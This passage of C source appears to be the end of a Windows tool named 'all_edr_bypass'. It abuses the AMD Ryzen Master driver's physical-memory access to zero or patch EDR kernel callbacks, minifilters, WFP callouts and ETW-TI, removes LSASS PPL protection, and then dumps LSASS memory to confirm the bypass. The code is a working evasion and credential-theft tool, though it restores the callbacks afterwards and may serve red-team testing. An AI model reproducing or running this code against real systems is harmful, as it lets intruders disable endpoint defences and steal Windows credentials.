    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if(h) IT_PASS("Handle obtained — OB+PPL bypassed");
    else {
        DWORD e=GetLastError();
        if(e==5) {
            if(!hq)
                IT_FAIL("Blocked at IRP level (hrdevmon.sys?) — need IRP unhook");
            else if(g_lsass_prot_api)
                IT_FAIL("PPL still active (prot=0x%02X, write didn't reach kernel)",g_lsass_prot_api);
            else
                IT_FAIL("OB still stripping rights (access denied, not PPL)");
        } else IT_FAIL("OpenProcess err=%lu",e);
    }
    return h;
}

static void it_etw(HANDLE hlsass)
{
    printf("\n[T3] ETW-TI — ReadProcessMemory into LSASS\n");
    if(!hlsass){IT_WARN("Skipped (no LSASS handle)");return;}
    uint8_t buf[64]={0}; SIZE_T br=0;
    if(ReadProcessMemory(hlsass,(LPCVOID)0x7FFE0000,buf,sizeof buf,&br)&&br>0)
        IT_PASS("ReadProcessMemory ok (%zu bytes)",(size_t)br);
    else
        IT_FAIL("ReadProcessMemory err=%lu",GetLastError());
}

static void it_flt(void)
{
    printf("\n[T4] Minifilter — write PE file, check EDR doesn't delete it\n");
    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp,tmp);
    char path[MAX_PATH]; snprintf(path,sizeof path,"%s\\edr_test_%lu.exe",tmp,(unsigned long)GetCurrentProcessId());
    HANDLE hf=CreateFileA(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hf==INVALID_HANDLE_VALUE){IT_FAIL("CreateFile err=%lu",GetLastError());return;}
    const uint8_t mz[64]={'M','Z',0x90,0,3,0,0,0,4,0,0,0,0xFF,0xFF,0,0,
                           0xb8,0,0,0,0,0,0,0,0x40,0,0,0,0,0,0,0,
                           0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
                           0,0,0,0,0,0,0,0,0,0,0,0,0x40,0,0,0};
    DWORD wr=0; WriteFile(hf,mz,sizeof mz,&wr,NULL); CloseHandle(hf);
    Sleep(800);
    hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){IT_FAIL("File deleted by EDR");return;}
    uint8_t rb[2]={0}; DWORD rr=0; ReadFile(hf,rb,2,&rr,NULL); CloseHandle(hf);
    DeleteFileA(path);
    if(rb[0]=='M'&&rb[1]=='Z') IT_PASS("PE file survived — minifilter DISABLED");
    else                        IT_FAIL("File content modified — minifilter active");
}

static void it_cm(void)
{
    printf("\n[T5] CM callback — write to HKCU\\SOFTWARE\\BypassTest\n");
    HKEY hk;
    if(RegCreateKeyExA(HKEY_CURRENT_USER,"SOFTWARE\\BypassTest",0,NULL,
                       REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hk,NULL)!=ERROR_SUCCESS)
    {IT_FAIL("RegCreateKey err=%lu",GetLastError());return;}
    DWORD v=0xDEADBEEF;
    LSTATUS s=RegSetValueExA(hk,"TestValue",0,REG_DWORD,(BYTE*)&v,4);
    RegCloseKey(hk);
    RegDeleteKeyA(HKEY_CURRENT_USER,"SOFTWARE\\BypassTest");
    if(s==ERROR_SUCCESS) IT_PASS("RegSetValueEx ok — CmCallback DISABLED");
    else                 IT_FAIL("RegSetValueEx err=%ld",s);
}

static void it_dump(HANDLE hlsass, DWORD lsass_pid)
{
    printf("\n[T6] LSASS dump — MiniDumpWriteDump (gold standard)\n");
    if(!hlsass){IT_WARN("Skipped (no LSASS handle)");return;}
    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp,tmp);
    char path[MAX_PATH]; snprintf(path,sizeof path,"%s\\lsass_%lu.dmp",tmp,(unsigned long)GetCurrentProcessId());
    HANDLE hf=CreateFileA(path,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                          FILE_ATTRIBUTE_NORMAL|FILE_FLAG_DELETE_ON_CLOSE,NULL);
    if(hf==INVALID_HANDLE_VALUE){IT_FAIL("CreateFile err=%lu",GetLastError());return;}
    BOOL ok=MiniDumpWriteDump(hlsass,lsass_pid,hf,
                              MiniDumpWithFullMemory|MiniDumpWithHandleData,
                              NULL,NULL,NULL);
    DWORD e=GetLastError();
    LARGE_INTEGER fsz={0}; GetFileSizeEx(hf,&fsz);
    CloseHandle(hf);
    if(ok) IT_PASS("MiniDumpWriteDump SUCCESS (%lld MB) — ALL bypasses confirmed!",(long long)(fsz.QuadPart>>20));
    else {
        if(e==5)         IT_FAIL("Access Denied — PPL/OB still blocking");
        else if(e==0x57) IT_FAIL("Invalid param (0x57) — ETW-TI may be blocking");
        else             IT_FAIL("MiniDumpWriteDump err=0x%08lX",e);
    }
}

/* T7: EICAR — write official AV test string, check WdFilter doesn't delete it.
 * String is split across two literals so this source file doesn't trigger AV. */
static void it_eicar(void)
{
    printf("\n[T7] EICAR — write AV test string, check WdFilter doesn't delete it\n");
    char tmp[MAX_PATH]; GetTempPathA(sizeof tmp, tmp);
    char path[MAX_PATH];
    snprintf(path, sizeof path, "%s\\eicar_%lu.com", tmp, (unsigned long)GetCurrentProcessId());

    /* Concatenate at runtime — keeps the source file from being flagged */
    char eicar[256];
    snprintf(eicar, sizeof eicar, "%s%s",
             "X5O!P%@AP[4\\PZX54(P^)7CC)7}$",
             "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { IT_FAIL("CreateFile err=%lu", GetLastError()); return; }
    DWORD wr = 0;
    WriteFile(hf, eicar, (DWORD)strlen(eicar), &wr, NULL);
    CloseHandle(hf);

    Sleep(1200);   /* give WdFilter time to react if it can */

    hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        IT_FAIL("EICAR deleted by WdFilter — minifilter still active!");
        return;
    }
    CloseHandle(hf);
    DeleteFileA(path);
    IT_PASS("EICAR survived — WdFilter real-time protection DISABLED");
}

static void run_inline_tests(DWORD lsass_pid)
{
    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" PHASE 4: VERIFY  (tests run while bypass is active)\n");
    printf("══════════════════════════════════════════════════════════\n");

    /* T2/T3/T6 first — LSASS handle tests must run immediately after
     * cache eviction before LSASS re-caches its EPROCESS.Protection */
    HANDLE hlsass = it_ob(lsass_pid);
    it_etw(hlsass);
    it_dump(hlsass, lsass_pid);
    if(hlsass){ CloseHandle(hlsass); hlsass=NULL; }

    /* Remaining tests are cache-insensitive (no LSASS handle needed) */
    it_eicar();
    it_flt();
    it_cm();
    it_ps();   /* last — has 2s WaitForSingleObject */

    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" VERIFY COMPLETE — restoring immediately\n");
    printf("══════════════════════════════════════════════════════════\n\n");
}

/* ══════════════════════════════════════════════════════════════════════
 * §9  DISPLAY HELPERS
 * ══════════════════════════════════════════════════════════════════════ */

static void print_edr_drivers(void)
{
    char seen[96][64]; int ns=0;

    /* ADD_SEEN: use is_edr_target so Microsoft OS / HW-vendor false positives
     * from callback scans don't pollute the inventory display */
    #define ADD_SEEN(n) do { \
        if(is_edr_target(n)){ \
            int _f=0; for(int _j=0;_j<ns;_j++) if(_stricmp(seen[_j],(n))==0){_f=1;break;} \
            if(!_f&&ns<96){strncpy(seen[ns],(n),63);seen[ns++][63]='\0';} \
        } \
    } while(0)

    /* From callback scans */
    for(int i=0;i<g_ob_n;i++)      ADD_SEEN(g_ob[i].drv);
    for(int i=0;i<g_flt_n_grp;i++) ADD_SEEN(g_flt_grp[i].driver);
    for(int i=0;i<g_cm_n;i++)      ADD_SEEN(g_cm[i].drv);
    for(int i=0;i<g_wfp_n;i++)     ADD_SEEN(g_wfp[i].drv);
    for(int i=0;i<g_wk_n;i++)      ADD_SEEN(g_wk[i].drv);

    /* Module list: only add known/suspected EDR products */
    for(int i=1;i<g_nmods;i++) ADD_SEEN(g_mods[i].name);
    #undef ADD_SEEN

    printf("\n  %-28s  %-7s  %s\n","Driver","In scan","Publisher");
    printf("  %.*s\n",72,"------------------------------------------------------------------------");
    for(int i=0;i<ns;i++){
        /* Was this driver found in any callback scan? */
        int in_scan=0;
        for(int j=0;j<g_ob_n&&!in_scan;j++)      if(_stricmp(g_ob[j].drv,seen[i])==0) in_scan=1;
        for(int j=0;j<g_flt_n_grp&&!in_scan;j++) if(_stricmp(g_flt_grp[j].driver,seen[i])==0) in_scan=1;
        for(int j=0;j<g_cm_n&&!in_scan;j++)      if(_stricmp(g_cm[j].drv,seen[i])==0) in_scan=1;
        for(int j=0;j<g_wfp_n&&!in_scan;j++)     if(_stricmp(g_wfp[j].drv,seen[i])==0) in_scan=1;
        for(int j=0;j<g_wk_n&&!in_scan;j++)      if(_stricmp(g_wk[j].drv,seen[i])==0) in_scan=1;

        const char *co=get_driver_company(seen[i]);
        printf("  %-28s  %-7s  %s\n",
               seen[i],
               in_scan ? "YES" : "no  ←",
               co?co:"(no version info)");
        if(!in_scan)
            printf("    [!] Not in any scan — may use IRP hooks or device filters\n");
    }
    if(!ns) printf("    (none — no non-system drivers loaded)\n");
}

/* ══════════════════════════════════════════════════════════════════════
 * §10  MAIN
 * ══════════════════════════════════════════════════════════════════════ */

int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    /* Enable ANSI VT escape sequences (needed on Win10 cmd.exe) */
    {HANDLE h=GetStdHandle(STD_OUTPUT_HANDLE);DWORD m=0;
     if(GetConsoleMode(h,&m)) SetConsoleMode(h,m|0x0004|0x0008);}

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║          all_edr_bypass — Combined EDR Bypass            ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    enable_debug_privilege();

    /* Open driver */
    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,
                      FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){
        printf("[-] Cannot open AMDRyzenMasterDriverV20: err=%lu\n",GetLastError());
        printf("    Is the driver loaded? Run as Administrator.\n"); return 1;
    }
    printf("[+] AMD driver opened\n");

    /* Physical ranges */
    load_ranges();
    printf("[+] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No physical ranges\n");CloseHandle(g_dev);return 1;}

    /* Module map */
    load_module_map();
    printf("[+] Kernel modules: %d\n",g_nmods);

    /* Find kernel CR3 for VA→PA translation (needed for minifilter list unlink) */
    g_kernel_cr3=find_kernel_cr3();
    if(g_kernel_cr3)
        printf("[+] Kernel CR3 (PML4 base): 0x%016llX\n\n",(unsigned long long)g_kernel_cr3);
    else
        printf("[!] Kernel CR3 not found — minifilter will use code-patch fallback\n\n");

    /* ntoskrnl */
    MOD_LIST *ml=get_module_list();
    if(!ml){printf("[-] Module list failed\n");CloseHandle(g_dev);return 1;}
    uint64_t nt_va=(uint64_t)ml->Modules[0].ImageBase;
    uint64_t nt_size=(uint64_t)ml->Modules[0].ImageSize;
    char nt_path[512]={0};
    {
        const char *fn=ml->Modules[0].FullPathName+ml->Modules[0].OffsetToFileName;
        char sd[MAX_PATH]; GetSystemDirectoryA(sd,sizeof sd);
        snprintf(nt_path,sizeof nt_path,"%s\\%s",sd,fn);
        if(GetFileAttributesA(nt_path)==INVALID_FILE_ATTRIBUTES)
            snprintf(nt_path,sizeof nt_path,"%s\\ntoskrnl.exe",sd);
    }
    free(ml);
    printf("[*] ntoskrnl VA=0x%016llX  size=0x%llX\n",(unsigned long long)nt_va,(unsigned long long)nt_size);

    /* Read ntoskrnl from disk */
    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){printf("[-] Cannot open %s\n",nt_path);CloseHandle(g_dev);return 1;}
    DWORD pe_sz=GetFileSize(hf,NULL); uint8_t *pe=(uint8_t*)malloc(pe_sz); DWORD rd=0;
    ReadFile(hf,pe,pe_sz,&rd,NULL); CloseHandle(hf);
    printf("[*] ntoskrnl disk: %lu bytes\n\n",(unsigned long)pe_sz);

    /* Find ntoskrnl PA */
    printf("[*] Finding ntoskrnl PA...\n");
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if(!nt_pa){printf("[-] ntoskrnl PA not found\n");free(pe);CloseHandle(g_dev);return 1;}
    printf("[+] ntoskrnl PA=0x%016llX\n\n",(unsigned long long)nt_pa);

    /* Resolve watchdog target VAs */
    wk_resolve_targets(pe,pe_sz,nt_va);

    SetConsoleCtrlHandler(ctrl_handler,TRUE);

    /* ── SCAN PHASE ─────────────────────────────────────────────────── */
    printf("══════════════════════════════════════════════════════════\n");
    printf(" PHASE 1: SCAN (read-only, no changes yet)\n");
    printf("══════════════════════════════════════════════════════════\n\n");

    /* Ps* notify — pass accumulating exclusion list so each array gets a unique VA */
    printf("[1/6] Ps* notify callback arrays (LEA scan)...\n");
    uint64_t ps_excl[4]={0}; int ps_nexcl=0;
    for(int i=0;i<3;i++){
        g_ps[i].array_va=ps_find_array(pe,pe_sz,nt_pa,nt_va,nt_size,g_ps[i].setter,ps_excl,ps_nexcl);
        if(g_ps[i].array_va){
            g_ps[i].array_pa=nt_pa+(g_ps[i].array_va-nt_va);
            ps_excl[ps_nexcl++]=g_ps[i].array_va; /* exclude this VA from subsequent searches */
            int live=0;
            for(int j=0;j<g_ps[i].max;j++){uint64_t v=0;phys_read(g_ps[i].array_pa+(uint64_t)j*8,&v,8);if(v) live++;}
            printf("    %-38s  live=%d  PA=0x%016llX\n",g_ps[i].name,live,(unsigned long long)g_ps[i].array_pa);
        } else {
            printf("    %-38s  NOT FOUND\n",g_ps[i].name);
        }
    }

    /* ── Combined pool scan: OB + FLT + CM + WFP in a single memory pass ── */
    printf("\n[2/6] Pool scan (OB + FLT + CM + WFP) — single pass, chunk=%uKB...\n",
           (unsigned)(CHUNK_SZ>>10));
    if(!g_flt_raw){g_flt_raw=(FltNode*)calloc(FLT_MAX_RAW,sizeof(FltNode));if(!g_flt_raw){printf("[-] OOM\n");goto cleanup;}}
    combined_pool_scan();
    printf("\n");

    /* OB results */
    {int e=0;for(int i=0;i<g_ob_n;i++) if(is_edr_target(g_ob[i].drv)) e++;
     printf("    OB  callbacks : %d total, %d EDR\n",g_ob_n,e);}

    /* FLT results */
    printf("    FLT candidates: %d raw  →  grouping...\n",g_flt_n_raw);
    flt_scan_stage2();
    {int e=0;for(int i=0;i<g_flt_n_grp;i++) if(g_flt_grp[i].cls==DRV_OTHER) e++;
     printf("    FLT groups    : %d total, %d EDR\n",g_flt_n_grp,e);}
    free(g_flt_raw); g_flt_raw=NULL;

    /* CM results */
    {int ea=0,eb=0;for(int i=0;i<g_cm_n;i++){if(!is_edr_target(g_cm[i].drv)) continue;if(g_cm[i].has_altitude) ea++;else eb++;}
     int e=ea+eb;
     printf("    CM  callbacks : %d total, %d EDR (alt=%d noalt=%d)\n",g_cm_n,e,ea,eb);}

    /* WFP results */
    {int e=0;for(int i=0;i<g_wfp_n;i++) if(is_edr_target(g_wfp[i].drv)) e++;
     printf("    WFP callouts  : %d total, %d EDR\n",g_wfp_n,e);}

    /* ETW-TI */
    printf("\n[3/6] ETW-TI exports:\n");
    {int np=0,ne=0;
     for(int i=0;ETW_TI_FUNCS[i];i++){uint32_t r=pe_export_rva(pe,pe_sz,ETW_TI_FUNCS[i]);if(r) np++;else ne++;}
     printf("    Exported: %d  Not on this build: %d\n",np,ne);
     if(np==0) printf("    [!] EtwTiLog* not exported — Method A skipped, Method B (GUID) will run\n");}

    /* Watchdog scan */
    printf("\n[4/6] Watchdog — scanning EDR driver code for IAT registration calls...\n");
    {
        char seen[32][64]; int ns=0;
        #define WK_ADD(n) do{if(is_edr_target(n)){int _f=0;for(int _j=0;_j<ns;_j++) if(_stricmp(seen[_j],(n))==0){_f=1;break;}if(!_f&&ns<32){strncpy(seen[ns],(n),63);seen[ns++][63]='\0';}}}while(0)
        for(int i=0;i<g_ob_n;i++)      WK_ADD(g_ob[i].drv);
        for(int i=0;i<g_flt_n_grp;i++) WK_ADD(g_flt_grp[i].driver);
        for(int i=0;i<g_cm_n;i++)      WK_ADD(g_cm[i].drv);
        #undef WK_ADD

        for(int di=0;di<ns;di++){
            uint64_t drv_va=0,drv_sz=0;
            for(int m=1;m<g_nmods;m++) if(_stricmp(g_mods[m].name,seen[di])==0){drv_va=g_mods[m].base;drv_sz=g_mods[m].size;break;}
            if(!drv_va) continue;
            printf("    Scanning %s...\n",seen[di]);
            uint64_t drv_pa=find_driver_pa_cached(seen[di]);
            if(!drv_pa){printf("      PA not found\n");continue;}
            wk_scan_driver(seen[di],drv_pa,drv_va,drv_sz);
        }
        printf("    Total call sites: %d\n",g_wk_n);
    }

    /* PPL EPROCESS scan */
    printf("\n[5/6] PPL bypass — EPROCESS scan (LSASS)...\n");
    {
        ppl_detect_offsets();
        g_lsass_pid = get_pid_by_name("lsass.exe");
        if (g_lsass_pid) {
            printf("    LSASS PID=%u\n", g_lsass_pid);
            ppl_scan(g_lsass_pid, pe, pe_sz, nt_va);
        } else {
            printf("    [!] lsass.exe not found\n");
        }
        if (g_lsass_ep.valid)
            printf("    LSASS EPROCESS: found  NtQIP_prot=0x%02X  OFF_PROT=0x%X\n",
                   g_lsass_prot_api, g_ep_off_prot);
        else
            printf("    LSASS EPROCESS: NOT found\n");
    }

    /* Summary */
    print_edr_drivers();
    free(pe); pe=NULL;

    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" PHASE 2: CONFIRM\n");
    printf("══════════════════════════════════════════════════════════\n\n");
    printf("  About to apply ALL EDR bypasses:\n");
    {int ps_live=0;for(int i=0;i<3;i++){for(int j=0;j<g_ps[i].max&&g_ps[i].array_pa;j++){uint64_t v=0;phys_read(g_ps[i].array_pa+(uint64_t)j*8,&v,8);if(v)ps_live++;}}
     printf("    [1] Watchdog Kill    — %d call site(s)\n",g_wk_n);
     printf("    [2] Ps* Notify       — %d live entries\n",ps_live);}
    {int e=0;for(int i=0;i<g_ob_n;i++)      if(is_edr_target(g_ob[i].drv))         e++;printf("    [3] ObCallbacks      — %d EDR\n",e);}
    {int e=0;for(int i=0;i<g_flt_n_grp;i++) if(is_edr_target(g_flt_grp[i].driver)) e++;printf("    [4] Minifilter       — %d EDR groups\n",e);}
    printf("    [5] ETW-TI           — Method A (exports) + Method B (GUID)\n");
    {int e=0;for(int i=0;i<g_cm_n;i++)      if(is_edr_target(g_cm[i].drv))         e++;printf("    [6] CmCallback       — %d EDR\n",e);}
    {int e=0;for(int i=0;i<g_wfp_n;i++)     if(is_edr_target(g_wfp[i].drv))        e++;printf("    [7] WFP Callouts     — %d EDR\n",e);}
    {printf("    [8] PPL (LSASS)      — %s NtQIP=0x%02X OFF=0x%X\n",
            g_lsass_ep.valid ? "ready," : "not found,",
            g_lsass_prot_api, g_ep_off_prot);}
    printf("\n  Proceed? [y/N]: "); fflush(stdout);
    char yn[8]={0}; fgets(yn,sizeof yn,stdin);
    if(yn[0]!='y'&&yn[0]!='Y'){printf("  Aborted.\n");goto cleanup;}

    /* ── APPLY PHASE ────────────────────────────────────────────────── */
    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" PHASE 3: APPLY\n");
    printf("══════════════════════════════════════════════════════════\n\n");

    printf("[1/8] Watchdog Kill...\n");
    {int ok=wk_apply(); printf("    Patched: %d/%d call sites\n\n",ok,g_wk_n);}

    printf("[2/8] Ps* Notify arrays...\n");
    for(int i=0;i<3;i++){
        if(!g_ps[i].array_pa){printf("    %-38s  skipped (not found)\n",g_ps[i].name);continue;}
        int ok=ps_zero(&g_ps[i]);
        printf("    %-38s  zeroed=%d\n",g_ps[i].name,ok);
    }

    printf("\n[3/8] ObRegisterCallbacks...\n");
    {int ok=ob_apply_edr(); printf("    Zeroed: %d EDR entries\n",ok);}

    printf("\n[4/8] Minifilter PreOp functions...\n");
    {int ok=flt_apply_edr(); printf("    Patched: %d unique functions\n",ok);}

    printf("\n[5/8] ETW-TI...\n");
    {
        /* Method A: code-patch EtwTiLog* prologues — only if exports exist */
        int ma=0;
        HANDLE hf2=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        if(hf2!=INVALID_HANDLE_VALUE){
            DWORD psz2=GetFileSize(hf2,NULL); uint8_t *pe2=(uint8_t*)malloc(psz2); DWORD rd2=0;
            ReadFile(hf2,pe2,psz2,&rd2,NULL); CloseHandle(hf2);
            /* Check if any EtwTiLog* are exported before attempting */
            int has_exp=0;
            for(int i=0;ETW_TI_FUNCS[i];i++) if(pe_export_rva(pe2,psz2,ETW_TI_FUNCS[i])){has_exp=1;break;}
            if(has_exp){
                printf("    Method A (code patch):\n");
                ma=etw_patch_funcs(pe2,psz2,nt_pa);
                printf("    Patched: %d function(s)\n",ma);
            } else {
                printf("    Method A: skipped (EtwTiLog* not exported on this build)\n");
            }
            free(pe2);
        }
        /* Method B: zero ETW-TI provider IsEnabled field via GUID scan */
        printf("    Method B (IsEnabled GUID scan):\n");
        int mb=etw_disable_provider();
        printf("    IsEnabled: %s\n",mb?"zeroed":"not found (build may not be vulnerable)");
    }

    printf("\n[6/8] CmRegisterCallback...\n");
    {int ok=cm_apply_edr(); printf("    Zeroed: %d EDR entries\n",ok);}

    printf("\n[7/8] WFP Callouts...\n");
    {int ok=wfp_apply_edr(); printf("    Zeroed: %d EDR callout(s)\n",ok);}

    printf("\n[8/8] PPL bypass (LSASS.Protection)...\n");
    {
        int ok=ppl_apply();
        if(!ok) printf("    FAILED — check diagnostic above\n");
        else if(!g_lsass_prot_api) printf("    (NtQIP=0x00 — not PPL-protected, no write needed)\n");
    }

    printf("\n[*] Cache eviction (multi-CCD)... "); fflush(stdout);
    cache_evict_multiccd();
    printf("done\n");
    g_anything_applied=1;

    /* ── SUMMARY ────────────────────────────────────────────────────── */
    printf("\n══════════════════════════════════════════════════════════\n");
    printf(" ALL EDR BYPASSES ACTIVE — running tests now\n");
    printf("══════════════════════════════════════════════════════════\n");
    fflush(stdout);

    /* Run all verification tests while bypasses are active */
    run_inline_tests(g_lsass_pid);

    /* ── RESTORE ────────────────────────────────────────────────────── */
    /* Snapshot what was zeroed BEFORE restore clears the flags */
    /* VSnap.sz = field width in bytes (4 for Enabled BOOL, 8 for pointer) */
    typedef struct{uint64_t pa; uint64_t orig; uint8_t sz;}VSnap;
    VSnap *vsnap=NULL; int vn=0, vcap=1024;
    vsnap=(VSnap*)malloc(vcap*sizeof(VSnap));
    if(vsnap){
        for(int i=0;i<3;i++)
            for(int j=0;j<g_ps[i].n_saved;j++)
                if(g_ps[i].entries[j].zeroed&&vn<vcap){
                    vsnap[vn].pa=g_ps[i].entries[j].entry_pa;
                    vsnap[vn].orig=g_ps[i].entries[j].orig_val;
                    vsnap[vn++].sz=8;}
        for(int i=0;i<g_ob_n;i++) if(g_ob[i].zeroed&&vn<vcap){
            if(g_ob[i].enabled_pa&&pa_in_range(g_ob[i].enabled_pa,4)){
                vsnap[vn].pa=g_ob[i].enabled_pa;
                vsnap[vn].orig=*(uint32_t*)g_ob[i].orig_en;
                vsnap[vn++].sz=4; /* Enabled is 4 bytes — compare only those */
            } else {
                vsnap[vn].pa=g_ob[i].preop_pa;
                vsnap[vn].orig=*(uint64_t*)g_ob[i].orig_pre;
                vsnap[vn++].sz=8;
            }
        }
        for(int i=0;i<g_cm_n;i++) if(g_cm[i].zeroed&&vn<vcap){
            vsnap[vn].pa=g_cm[i].func_pa; vsnap[vn].orig=*(uint64_t*)g_cm[i].orig; vsnap[vn++].sz=8;}
        for(int i=0;i<g_wfp_n;i++) if(g_wfp[i].zeroed&&vn<vcap){
            vsnap[vn].pa=g_wfp[i].classify_pa; vsnap[vn].orig=*(uint64_t*)g_wfp[i].orig_cl; vsnap[vn++].sz=8;}
        if(g_ppl_applied && g_lsass_ep.valid && vn<vcap){
            vsnap[vn].pa=g_lsass_ep.pa+(uint64_t)g_ep_off_prot;
            vsnap[vn].orig=g_lsass_ep.prot_orig;
            vsnap[vn++].sz=1;}
        for(int gi=0;gi<g_flt_n_grp;gi++)
            for(int j=0;j<g_flt_grp[gi].n;j++){
                FltNode *nd=&g_flt_grp[gi].nodes[j]; if(!nd->unlinked) continue;
                if(vn<vcap){vsnap[vn].pa=nd->ulpf_pa;vsnap[vn].orig=nd->ulpf_orig;vsnap[vn++].sz=8;}
                if(vn<vcap){vsnap[vn].pa=nd->ulnb_pa;vsnap[vn].orig=nd->ulnb_orig;vsnap[vn++].sz=8;}
            }
    }

    restore_all();

    printf("[*] Verifying restore...\n");
    int v_ok=0;
    for(int i=0;i<vn;i++){
        uint64_t cur=0;
        if(!phys_read(vsnap[i].pa,&cur,vsnap[i].sz)) continue;
        uint64_t mask=(vsnap[i].sz>=8)?~0ULL:((1ULL<<(vsnap[i].sz*8))-1);
        if((cur&mask)==(vsnap[i].orig&mask)) v_ok++;
    }
    if(vsnap) free(vsnap);
    printf("    %d/%d entries verified restored\n\n",v_ok,vn);
    if(v_ok<vn) printf("[!] %d entries not confirmed — likely re-registered by EDR (normal) or reboot needed\n\n",vn-v_ok);
    else         printf("[+] All entries confirmed restored.\n\n");
    printf("[+] Done. All EDR callbacks re-enabled.\n");

cleanup:
    if(pe) free(pe);
    if(g_flt_raw) free(g_flt_raw);
    CloseHandle(g_dev);
    return 0;
}
